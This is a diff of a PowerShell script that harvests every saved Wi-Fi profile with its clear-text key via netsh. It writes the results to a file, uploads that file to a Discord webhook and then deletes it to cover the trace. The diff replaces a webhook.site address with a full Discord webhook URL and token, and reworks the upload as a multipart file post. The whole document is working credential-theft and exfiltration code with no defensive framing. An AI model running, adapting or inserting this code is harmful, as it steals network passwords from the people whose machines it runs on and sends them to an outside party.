@@ -1,7 +1,5 @@
-# Created by mrproxy
-
 # Discord webhook URL
-$webhook = "https://webhook.site/9a9a0453-5451-43ce-a84a-682441061c46"
+$webhook = "https://discord.com/api/webhooks/1301990032567042159/PP7RFPrRII5BKybbo1-7o-YAxVRcdmZmzPMJEt6pcJaSoyc6aWhG4tEzAOeuJXhQRjnw"
 
 # Output file to save Wi-Fi profiles and passwords
 $outputFile = "C:\ProgramData\WifiPasswords.txt"
@@ -20,28 +18,8 @@ if (Test-Path $outputFile) {
     New-Item -Path $outputFile -ItemType File | Out-Null
 }
 
-# Function for sending messages through Discord Webhook
-function Send-DiscordMessage {
-    param (
-        [string]$message
-    )
-
-    $body = @{
-        content = $message
-    }
-
-    try {
-        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-    } catch {
-        Write-Host "Failed to send message to Discord: $_"
-    }
-}
-
-# Start message
-$discordMessage = "**Wi-Fi Passwords Collected:**`n"
-$discordMessage += "`n------------------------------`n"
-
-# Dump Wi-Fi profiles and passwords
+# Dump Wi-Fi profiles and passwords into the output file
+Add-Content -Path $outputFile -Value "Wi-Fi Passwords Collected:`r`n------------------------------`r`n"
 netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
     $profileName = $_ -replace ".*: ", ""
     $wifiDetails = netsh wlan show profile "$profileName" key=clear
@@ -62,29 +40,53 @@ netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
     $authType = if ($authTypeLine) { $authTypeLine -replace ".*: ", "" } else { "N/A" }
     $cipher = if ($cipherLine) { $cipherLine -replace ".*: ", "" } else { "N/A" }
 
-    # Gather necessary profile details with Markdown formatting
-    $profileInfo = @"
-**Profile Name:** **$profileName**
-**SSID Name:** **$ssid**
-**Key Content:** **$keyContent**
+    # Append profile information to the output file
+    Add-Content -Path $outputFile -Value @"
+Profile Name: $profileName
+SSID Name: $ssid
+Key Content: $keyContent
 
-**Connection Mode:** $connectionMode
-**Network Type:** $networkType
-**Authentication Type:** $authType
-**Cipher:** $cipher
-------------------------------`n
+Connection Mode: $connectionMode
+Network Type: $networkType
+Authentication Type: $authType
+Cipher: $cipher
+------------------------------
 "@
-
-    # Append to the Discord message
-    $discordMessage += $profileInfo
 }
 
-# Conclude message with total number of profiles collected
-$profileCount = ($discordMessage -split "`n------------------------------").Count - 1
-$discordMessage += "***Total Profiles Collected:*** **$profileCount**`n"
+# Function for sending the file to Discord Webhook
+function Send-DiscordFile {
+    param (
+        [string]$filePath
+    )
 
-# Send the formatted message to Discord
-Send-DiscordMessage -message $discordMessage
+    # Read file content as string
+    $fileContent = Get-Content -Path $filePath -Raw
+
+    # Create the multipart body
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
+
+    # Build the body as a byte array
+    $body = @()
+    $body += "--$boundary`r`n"
+    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"WifiPasswords.txt`"`r`n"
+    $body += "Content-Type: text/plain`r`n`r`n"
+    $body += $fileContent
+    $body += "`r`n--$boundary--`r`n"
+
+    # Convert body to bytes
+    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body -join '')
+
+    try {
+        Invoke-RestMethod -Uri $webhook -Method Post -Body $bodyBytes -Headers $headers
+    } catch {
+        Write-Host "Failed to send file to Discord: $_"
+    }
+}
+
+# Send the output file
+Send-DiscordFile -filePath $outputFile
 
 # Clean up
 Remove-Item $outputFile -Force
